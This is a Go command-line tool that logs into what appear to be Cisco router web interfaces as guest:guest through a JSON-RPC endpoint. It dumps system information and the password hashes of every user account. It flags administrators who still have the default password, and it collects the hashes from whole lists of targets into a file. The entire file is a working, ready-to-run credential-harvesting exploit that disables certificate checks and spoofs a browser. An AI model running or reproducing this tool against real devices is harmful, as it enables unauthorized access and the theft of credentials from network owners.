package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	user            = "guest"
	pass            = "guest"
	defaultHash     = "$1$UxUxowL4$DEDAVDke5lVeqzk0Rj2oW1"
	defaultHashFile = "/SADDLEBACK/ops/CISCO/hashes"
	userAgent       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; FA2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
)

type rpcClient struct {
	target    string
	vhost     string
	csrfToken string
	http      *http.Client
}

type config struct {
	help         bool
	target       string
	hostOverride string
	listPath     string
	outputFile   string
}

type targetResult struct {
	target string
	users  []userRecord
}

type userRecord struct {
	name     string
	group    string
	password string
}

type fatalError string

func (e fatalError) Error() string {
	return string(e)
}

func main() {
	cfg, err := parseArgs(os.Args[1:])
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n\n", err)
		printUsage()
		os.Exit(1)
	}

	if cfg.help {
		printUsage()
		return
	}

	if cfg.listPath != "" {
		targets, err := readTargetList(cfg.listPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] %v\n", err)
			os.Exit(1)
		}

		failures := 0
		successes := 0
		results := make([]targetResult, 0, len(targets))
		for i, target := range targets {
			fmt.Printf("\n========== [%d/%d] %s ==========\n", i+1, len(targets), target)
			result, err := runTarget(target, cfg.hostOverride, cfg.outputFile)
			if err != nil {
				fmt.Println(err)
				failures++
			} else {
				successes++
				results = append(results, *result)
			}
		}
		fmt.Printf("\n[*] Batch complete: %d succeeded, %d failed\n", successes, failures)
		printBatchHashSummary(results)
		if failures > 0 {
			os.Exit(1)
		}
		return
	}

	if _, err := runTarget(cfg.target, cfg.hostOverride, cfg.outputFile); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runTarget(target, hostOverride, outputFile string) (result *targetResult, err error) {
	defer func() {
		if r := recover(); r != nil {
			if e, ok := r.(fatalError); ok {
				err = e
				return
			}
			panic(r)
		}
	}()

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(target, "443"), 5*time.Second)
	if err != nil {
		failf("\n[!] %s:443 unreachable: %v", target, err)
	}
	_ = conn.Close()
	fmt.Printf("\n[+] %s:443 is reachable\n", target)

	vhost := hostOverride
	if vhost == "" {
		vhost = getCertCN(target)
	}
	if vhost != "" && vhost != target {
		fmt.Printf("[*] Using Host header: %s\n", vhost)
	} else {
		vhost = ""
	}

	client := &rpcClient{
		target: target,
		vhost:  vhost,
		http: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Match Python's CERT_NONE behavior.
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
	client.csrfToken = client.probeLoginPage()

	fmt.Printf("\n[*] Logging in as %s:%s\n", user, pass)
	resp := client.jsonrpc("login", map[string]any{"user": user, "pass": b64(pass)}, "")
	rpcResult := asMap(resp["result"])
	code := rpcResult["code"]
	token, _ := rpcResult["errstr"].(string)

	fmt.Printf("[+] Code=%s\n[+] Token=%s...\n", formatJSONValue(code), tokenDisplay(token, 48))

	if !loginCodeOK(code) || token == "" || len(token) < 32 {
		failf("[!] Login failed: %s", token)
	}

	fmt.Println("\n[+] System Information")
	resp = client.jsonrpc("get_sys_info", map[string]any{}, token)
	sysInfo := asMap(asMap(resp["result"])["system"])
	fmt.Printf("[*] Hostname : %s\n", stringValue(sysInfo["hostname"], "N/A"))
	clock := asMap(sysInfo["clock"])
	fmt.Printf("[*] Timezone : %s\n", stringValue(clock["timezone-name"], "N/A"))
	dst := asMap(clock["timezone-summer-time"])
	fmt.Printf("[*] DST      : %s\n", enabledDisabled(dst["enabled"]))
	ntp := asMap(sysInfo["ntp"])
	fmt.Printf("[*] NTP      : %s\n", enabledDisabled(ntp["enabled"]))

	fmt.Println("\n[*] Leaking...")
	fmt.Println()
	resp = client.jsonrpc("get_users", map[string]any{}, token)
	users := normalizeUsers(asMap(asMap(resp["result"])["users"])["user"])
	if len(users) == 0 {
		users = normalizeUsers(asMap(resp["result"])["users"])
	}

	defaultPWUsers := make([]string, 0)
	newHashes := make([]string, 0)
	records := make([]userRecord, 0, len(users))
	for _, u := range users {
		name := stringValue(u["name"], "?")
		pw := stringValue(u["password"], "?")
		group := stringValue(u["group"], "?")
		fmt.Printf("[+] %-16s %-12s %s\n", name, group, pw)
		records = append(records, userRecord{name: name, group: group, password: pw})
		if group == "admin" && pw == defaultHash {
			defaultPWUsers = append(defaultPWUsers, name)
		}
		if name != "guest" && pw != "" && pw != "?" {
			newHashes = append(newHashes, pw)
		}
	}

	processHashes(newHashes, outputFile)

	for _, name := range defaultPWUsers {
		fmt.Printf("\n[+] Default Password! (%s:cisco)\n", name)
	}

	fmt.Println("\n[*] Password complexity policy")
	resp = client.jsonrpc("get_password_complexity", map[string]any{}, token)
	pc := asMap(asMap(resp["result"])["password-complexity"])
	if len(pc) == 0 {
		fmt.Printf("[!] get_password_complexity returned: %s\n", formatJSON(resp))
	} else {
		fmt.Printf("[*] Enabled          : %s\n", formatJSONValue(pc["enabled"]))
		fmt.Printf("[*] Minimum length   : %s\n", formatJSONValue(pc["minimum-length"]))
		fmt.Printf("[*] Char classes req : %s\n", formatJSONValue(pc["minimum-number-character-classes"]))
		fmt.Printf("[*] Must differ      : %s\n", formatJSONValue(pc["new-must-different-than-current"]))
	}

	return &targetResult{target: target, users: records}, nil
}

func printBatchHashSummary(results []targetResult) {
	if len(results) == 0 {
		return
	}

	fmt.Println("\n[+] Collected: ")
	for _, result := range results {
		fmt.Printf("\n%s\n\n", result.target)
		for _, user := range result.users {
			if user.name == "guest" {
				continue
			}
			fmt.Printf("[+] %-16s %-12s %s\n", user.name, user.group, user.password)
		}
	}
}

func parseArgs(args []string) (config, error) {
	cfg := config{target: "192.168.0.2", outputFile: defaultHashFile}
	positionals := make([]string, 0, 2)

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch {
		case isHelpArg(arg):
			cfg.help = true
			return cfg, nil
		case arg == "-iL":
			i++
			if i >= len(args) {
				return cfg, errors.New("-iL requires a target list file")
			}
			cfg.listPath = args[i]
		case strings.HasPrefix(arg, "-iL="):
			cfg.listPath = strings.TrimPrefix(arg, "-iL=")
			if cfg.listPath == "" {
				return cfg, errors.New("-iL requires a target list file")
			}
		case arg == "-o":
			i++
			if i >= len(args) {
				return cfg, errors.New("-o requires an output file")
			}
			cfg.outputFile = args[i]
			if cfg.outputFile == "" {
				return cfg, errors.New("-o requires an output file")
			}
		case strings.HasPrefix(arg, "-o="):
			cfg.outputFile = strings.TrimPrefix(arg, "-o=")
			if cfg.outputFile == "" {
				return cfg, errors.New("-o requires an output file")
			}
		case strings.HasPrefix(arg, "-"):
			return cfg, fmt.Errorf("unknown option: %s", arg)
		default:
			positionals = append(positionals, arg)
		}
	}

	if cfg.listPath != "" {
		if len(positionals) > 1 {
			return cfg, errors.New("batch mode accepts at most one host_header_override positional argument")
		}
		if len(positionals) == 1 {
			cfg.hostOverride = positionals[0]
		}
		return cfg, nil
	}

	if len(positionals) > 2 {
		return cfg, errors.New("too many positional arguments")
	}
	if len(positionals) > 0 {
		cfg.target = positionals[0]
	}
	if len(positionals) > 1 {
		cfg.hostOverride = positionals[1]
	}
	return cfg, nil
}

func readTargetList(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("failed opening target list %s: %w", path, err)
	}
	defer f.Close()

	targets := make([]string, 0)
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if idx := strings.IndexByte(line, '#'); idx >= 0 {
			line = strings.TrimSpace(line[:idx])
		}
		if line != "" {
			targets = append(targets, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("failed reading target list %s: %w", path, err)
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("target list %s did not contain any targets", path)
	}
	return targets, nil
}

func isHelpArg(arg string) bool {
	return arg == "-h" || arg == "--help" || arg == "help"
}

func printUsage() {
	fmt.Print(`Authenticate as guest and call get_users.

Usage:
  getUsers [target_ip_or_host] [host_header_override] [-o output_file]
  getUsers -iL target_list [host_header_override] [-o output_file]

Arguments:
  target_ip_or_host       Target HTTPS host or IP.
  host_header_override    Optional Host header override. If omitted, the tool
                          tries to derive one from the target certificate CN.
  -iL target_list         Read target hosts/IPs from a file, one per line.
                          Blank lines and # comments are ignored.
  -o output_file          File to append de-duplicated hashes to.
                          Default: /SADDLEBACK/ops/CISCO/hashes

Examples:
  ./getUsers
  ./getUsers 192.168.0.2
  ./getUsers 192.168.0.2 router.local
  ./getUsers -iL targets.txt
  ./getUsers -iL targets.txt -o hashes.txt
`)
}

func getCertCN(host string) string {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	})
	if err != nil {
		return ""
	}
	defer conn.Close()

	state := conn.ConnectionState()
	if len(state.PeerCertificates) == 0 {
		return ""
	}

	text := strings.ToValidUTF8(string(state.PeerCertificates[0].Raw), "\uFFFD")
	re := regexp.MustCompile(`CN=([A-Za-z0-9._-]+)`)
	matches := re.FindStringSubmatch(text)
	if len(matches) < 2 {
		return ""
	}
	return matches[1]
}

func (c *rpcClient) probeLoginPage() string {
	headers := map[string]string{
		"User-Agent": userAgent,
		"Cookie":     "selected_language=English",
	}
	body, _, err := c.request("GET", "/login.html", nil, headers, "")
	if err != nil {
		fmt.Printf("[*] probe_login_page: %v\n", err)
		return ""
	}

	re := regexp.MustCompile(`(?i)csrf[_-]?token["\s:=']+([A-Za-z0-9_-]{16,})`)
	matches := re.FindStringSubmatch(body)
	if len(matches) < 2 {
		return ""
	}
	fmt.Printf("[*] CSRF token: %s\n", matches[1])
	return matches[1]
}

func (c *rpcClient) post(path string, body []byte, cookie string) map[string]any {
	base := c.target
	if c.vhost != "" {
		base = c.vhost
	}

	headers := map[string]string{
		"Content-Type":   "application/json",
		"Content-Length": fmt.Sprintf("%d", len(body)),
		"Referer":        fmt.Sprintf("https://%s/login.html", base),
		"Origin":         fmt.Sprintf("https://%s", base),
		"User-Agent":     userAgent,
		"Cookie":         "selected_language=English",
	}
	if c.csrfToken != "" {
		headers["X-CSRF-Token"] = c.csrfToken
	}
	if cookie != "" {
		headers["Cookie"] += "; sessionid=" + cookie
	}

	raw, status, err := c.request("POST", path, body, headers, cookie)
	if err != nil {
		failf("[!] %v", err)
	}
	if strings.TrimSpace(raw) == "" {
		failf("[!] Empty response (HTTP %s)", status)
	}

	var out map[string]any
	if err := json.Unmarshal([]byte(raw), &out); err != nil {
		snippet := strings.ReplaceAll(firstN(raw, 512), "\n", " ")
		failf("[!] Non-JSON (HTTP %s): %s", status, snippet)
	}
	return out
}

func (c *rpcClient) request(method, path string, body []byte, headers map[string]string, _ string) (string, string, error) {
	url := fmt.Sprintf("https://%s%s", net.JoinHostPort(c.target, "443"), path)
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reader)
	if err != nil {
		return "", "", err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if c.vhost != "" {
		req.Host = c.vhost
	}

	resp, err := c.http.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Sprintf("%d %s", resp.StatusCode, resp.Status), err
	}
	return strings.ToValidUTF8(string(raw), "\uFFFD"), fmt.Sprintf("%d %s", resp.StatusCode, http.StatusText(resp.StatusCode)), nil
}

func (c *rpcClient) jsonrpc(method string, params map[string]any, token string) map[string]any {
	body, err := json.Marshal(map[string]any{
		"jsonrpc": "2.0",
		"method":  method,
		"params":  params,
	})
	if err != nil {
		failf("[!] json encode failed: %v", err)
	}
	return c.post("/jsonrpc", body, token)
}

func processHashes(newHashes []string, outputFile string) {
	if len(newHashes) == 0 {
		return
	}

	existing := make(map[string]struct{})
	if data, err := os.ReadFile(outputFile); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				existing[line] = struct{}{}
			}
		}
	} else if !os.IsNotExist(err) {
		failf("[!] Failed reading %s: %v", outputFile, err)
	}

	toAppend := make([]string, 0)
	for _, h := range newHashes {
		if _, ok := existing[h]; !ok {
			toAppend = append(toAppend, h)
		}
	}

	if len(toAppend) == 0 {
		fmt.Printf("\n[*] All hashes already in %s\n", outputFile)
		return
	}

	f, err := os.OpenFile(outputFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		failf("[!] Failed opening %s: %v", outputFile, err)
	}
	defer f.Close()

	for _, h := range toAppend {
		if _, err := f.WriteString(h + "\n"); err != nil {
			failf("[!] Failed writing %s: %v", outputFile, err)
		}
	}
	fmt.Printf("\n[*] Appended %d new hash(es) to %s\n", len(toAppend), outputFile)
}

func normalizeUsers(v any) []map[string]any {
	switch users := v.(type) {
	case []any:
		out := make([]map[string]any, 0, len(users))
		for _, u := range users {
			if m := asMap(u); len(m) > 0 {
				out = append(out, m)
			}
		}
		return out
	case map[string]any:
		return []map[string]any{users}
	default:
		return nil
	}
}

func asMap(v any) map[string]any {
	if m, ok := v.(map[string]any); ok {
		return m
	}
	return map[string]any{}
}

func b64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func enabledDisabled(v any) string {
	if truthy(v) {
		return "enabled"
	}
	return "disabled"
}

func truthy(v any) bool {
	switch x := v.(type) {
	case bool:
		return x
	case string:
		return x != "" && x != "false" && x != "False" && x != "0"
	case float64:
		return x != 0
	case int:
		return x != 0
	default:
		return false
	}
}

func stringValue(v any, fallback string) string {
	if v == nil {
		return fallback
	}
	if s, ok := v.(string); ok {
		if s == "" {
			return fallback
		}
		return s
	}
	return formatJSONValue(v)
}

func formatJSONValue(v any) string {
	switch x := v.(type) {
	case nil:
		return "<nil>"
	case bool:
		if x {
			return "True"
		}
		return "False"
	case float64:
		if x == float64(int64(x)) {
			return fmt.Sprintf("%d", int64(x))
		}
		return fmt.Sprintf("%v", x)
	case string:
		return x
	default:
		return fmt.Sprintf("%v", x)
	}
}

func formatJSON(v any) string {
	b, err := json.Marshal(v)
	if err != nil {
		return fmt.Sprintf("%v", v)
	}
	return string(b)
}

func loginCodeOK(code any) bool {
	switch x := code.(type) {
	case float64:
		return x == 0 || x == 2
	case int:
		return x == 0 || x == 2
	case string:
		return x == "0" || x == "2"
	default:
		return false
	}
}

func tokenPrefix(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func tokenDisplay(s string, n int) string {
	if s == "" {
		return "None"
	}
	return tokenPrefix(s, n)
}

func firstN(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func failf(format string, args ...any) {
	panic(fatalError(fmt.Sprintf(format, args...)))
}
